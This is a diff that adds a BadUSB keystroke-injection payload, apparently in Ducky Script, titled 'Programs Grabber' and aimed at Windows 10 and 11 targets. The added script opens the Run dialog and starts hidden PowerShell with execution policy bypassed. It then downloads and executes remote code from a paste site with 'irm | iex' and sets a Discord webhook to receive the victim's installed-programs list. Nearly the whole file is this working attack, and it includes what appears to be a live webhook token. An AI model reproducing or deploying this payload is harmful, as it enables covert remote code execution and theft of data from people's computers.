@@ -1,0 +1,12 @@
+REM     Title: Programs Grabber
+
+REM     Author: ValentinLvrr
+
+REM     Description: This payload grabs your target programs list
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1132291904999010356/JC8295unA2D84sUIo8OTfZAiKjE4xR7fQYE4s_kl4eBrpkRB7jyvzoaR9N3D2cTZ9CBk';irm hastebin.skyra.pw/raw/ofupokalun | iex
+ENTER
